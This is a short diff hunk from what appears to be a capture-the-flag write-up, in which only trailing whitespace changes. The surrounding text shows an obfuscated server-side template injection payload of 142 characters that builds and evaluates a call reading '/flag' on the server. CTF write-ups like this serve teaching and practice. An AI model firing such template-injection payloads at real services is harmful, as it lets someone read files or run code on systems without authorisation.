@@ -166,7 +166,7 @@ The final payload is (open("/flag").read()). The external parenthesis are there 
 ```text
 {%raw%}{{('(o'%2B(66%2B44%2B1%2B1)|ch%2B'e'%2B(66%2B44)|ch%2B'("'%2B(44%2B1%2B1%2B1)|ch%2B(66%2B6*6)|ch%2B'l'%2B(4*4*6%2B1)|ch%2B(66%2B6*6%2B1)|ch%2B'")'%2B(46)|ch%2B're'%2B(4*4*6%2B1)|ch%2B'd())')|e}}{%endraw%}
 ```
-Its lenght is of 142 chars ("%2B" is translated in "+", so it is counted as a single char). Probably there are shorter payloads, but this has done the trick for me. 
+Its lenght is of 142 chars ("%2B" is translated in "+", so it is counted as a single char). Probably there are shorter payloads, but this has done the trick for me.  
 Sending it to the server will give us our flag.
 
 ```
